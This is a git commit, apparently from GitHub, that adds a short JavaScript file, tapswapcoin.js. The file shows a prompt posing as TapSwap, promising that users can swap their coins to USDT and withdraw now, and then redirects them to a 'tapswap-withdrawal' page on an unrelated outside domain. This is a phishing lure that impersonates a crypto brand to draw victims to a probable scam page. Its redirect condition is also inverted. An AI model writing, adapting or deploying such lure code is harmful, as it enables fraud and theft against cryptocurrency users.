deb2aebd8a76a52e339bbfb8c4addaf82727118c
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-23 17:21:23 -0700

    Create tapswapcoin.js

---
+++ tapswapcoin.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('TapSwap: Dear TapSwappers, you can now swap all your coins to USDT and withdraw them, press 1 to withdraw now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/tapswap-withdrawal.html';
+}
